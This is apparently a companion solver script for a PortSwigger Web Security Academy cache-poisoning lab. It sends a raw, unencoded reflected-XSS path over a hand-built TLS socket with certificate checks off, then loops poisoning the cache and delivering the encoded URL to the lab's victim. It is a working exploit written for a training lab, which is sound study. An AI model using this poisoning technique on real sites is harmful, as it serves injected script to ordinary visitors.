#!/usr/bin/env python3
"""
URL normalization
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 09-url-normalization.md

What this does -- and why it needs a raw socket:
    Every standard HTTP client library (httpx, requests) percent-encodes a
    path the same way a browser would before it ever leaves, so a payload
    like /random"><script>alert(1)</script> always arrives at the server
    already encoded and harmless. The cache, though, normalizes percent
    escapes for its own cache-key comparisons -- it treats the decoded and
    encoded forms of the same path as equivalent. To actually get the raw,
    unencoded bytes onto the wire (the one thing that lets us poison the
    cache with a payload no browser would ever send on its own), this script
    opens a TLS socket directly and writes the HTTP request line by hand,
    bypassing httpx's encoding entirely. It then delivers the properly
    percent-encoded equivalent URL to the lab's victim, which resolves to
    the same normalized cache key.

Usage:
    python 09-url-normalization.py <lab-url>
    e.g. python 09-url-normalization.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import re
import socket
import ssl
import sys
from urllib.parse import quote, urlparse
import httpx


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


def _raw_get(host: str, path: str, extra_headers: dict = None, use_ssl: bool = True) -> tuple:
    """Send a raw GET with an unencoded path (bypasses httpx URL normalization).

    Returns (status_code: int, headers: dict, body: str).
    """
    port = 443 if use_ssl else 80
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        sock = ctx.wrap_socket(sock, server_hostname=host)

    lines = [f"GET {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
    if extra_headers:
        for k, v in extra_headers.items():
            lines.append(f"{k}: {v}")
    lines.append("")
    lines.append("")
    sock.send("\r\n".join(lines).encode())

    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    sock.close()

    resp = data.decode(errors="replace")
    head_end = resp.find("\r\n\r\n")
    head_part = resp[:head_end] if head_end > 0 else resp
    body_part = resp[head_end + 4:] if head_end > 0 else ""

    status = 0
    hdrs = {}
    for i, line in enumerate(head_part.split("\r\n")):
        if i == 0:
            parts = line.split(" ", 2)
            status = int(parts[1]) if len(parts) > 1 else 0
        elif ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.strip().lower()] = v.strip()

    return status, hdrs, body_part


async def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname
    xss_path = '/random"><script>alert(1)</script>'
    encoded_url = f"{lab_url}{quote(xss_path, safe='/')}"

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: confirm the raw, unencoded payload reflects unescaped.
        status, hdrs, body = _raw_get(host, xss_path)
        if "<script>alert(1)</script>" in body:
            print(f"[+] Raw socket: XSS reflected unescaped in 404 page (status {status})")
        else:
            print(f"[-] XSS not reflected unescaped (status {status}) -- cannot proceed")
            return

        max_age = re.search(r"max-age=(\d+)", hdrs.get("cache-control", ""))
        ttl = int(max_age.group(1)) if max_age else 30
        print(f"[*] Cache: x-cache={hdrs.get('x-cache', 'N/A')}, max-age={ttl}")

        # Step 2: the cache TTL here is short (~10s), so poison and deliver
        # have to happen back-to-back rather than as separate phases.
        print("[*] Re-poison + deliver loop...")
        for cycle in range(20):
            status, hdrs, body = _raw_get(host, xss_path)
            x_cache = hdrs.get("x-cache", "N/A")
            has_xss = "<script>alert(1)</script>" in body
            if x_cache.lower() == "miss" and has_xss:
                print(f"    Cycle {cycle + 1}: POISONED (miss) -> delivering to victim")
                r = await client.post(f"{lab_url}/deliver-to-victim", data={"answer": encoded_url})
                print(f"    Deliver response: {r.status_code}")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(2)

    print("[-] Not solved after re-poison + deliver loop")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
